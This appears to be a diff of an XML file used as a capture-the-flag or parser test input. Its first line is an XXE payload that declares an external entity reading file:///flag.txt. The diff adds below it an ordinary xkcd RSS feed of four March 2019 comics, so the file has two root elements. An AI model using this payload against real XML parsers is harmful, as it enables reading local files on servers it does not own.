@@ -1,1 +1,45 @@
 <?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///flag.txt'>]><root>&test;</root>
+<rss version="2.0">
+<channel>
+<title>xkcd.com</title>
+<link>https://xkcd.com/</link>
+<description>xkcd.com: A webcomic of romance and math humor.</description>
+<language>en</language>
+<item>
+<title>Luna 2</title>
+<link>https://xkcd.com/2125/</link>
+<description>
+<img src="https://imgs.xkcd.com/comics/luna_2.png" title="The flags were probably vaporized on impact, because we launched it before we had finished figuring out how to land. That makes sense from an engineering standpoint, but also feels like a metaphor." alt="The flags were probably vaporized on impact, because we launched it before we had finished figuring out how to land. That makes sense from an engineering standpoint, but also feels like a metaphor." />
+</description>
+<pubDate>Mon, 18 Mar 2019 04:00:00 -0000</pubDate>
+<guid>https://xkcd.com/2125/</guid>
+</item>
+<item>
+<title>Space Mission Hearing</title>
+<link>https://xkcd.com/2124/</link>
+<description>
+<img src="https://imgs.xkcd.com/comics/space_mission_hearing.png" title="Our grant application contains one of those little greeting card speakers that plays spaceship noises when you open it." alt="Our grant application contains one of those little greeting card speakers that plays spaceship noises when you open it." />
+</description>
+<pubDate>Fri, 15 Mar 2019 04:00:00 -0000</pubDate>
+<guid>https://xkcd.com/2124/</guid>
+</item>
+<item>
+<title>Meta Collecting</title>
+<link>https://xkcd.com/2123/</link>
+<description>
+<img src="https://imgs.xkcd.com/comics/meta_collecting.png" title="I'm trying to get the page locked because some jerk keeps adding &quot;Yachts&quot;." alt="I'm trying to get the page locked because some jerk keeps adding &quot;Yachts&quot;." />
+</description>
+<pubDate>Wed, 13 Mar 2019 04:00:00 -0000</pubDate>
+<guid>https://xkcd.com/2123/</guid>
+</item>
+<item>
+<title>Size Venn Diagram</title>
+<link>https://xkcd.com/2122/</link>
+<description>
+<img src="https://imgs.xkcd.com/comics/size_venn_diagram.png" title="Terms I'm going to start using: The Large Dipper, great potatoes, the Big Hadron Collider, and Large Orphan Annie." alt="Terms I'm going to start using: The Large Dipper, great potatoes, the Big Hadron Collider, and Large Orphan Annie." />
+</description>
+<pubDate>Mon, 11 Mar 2019 04:00:00 -0000</pubDate>
+<guid>https://xkcd.com/2122/</guid>
+</item>
+</channel>
+</rss>
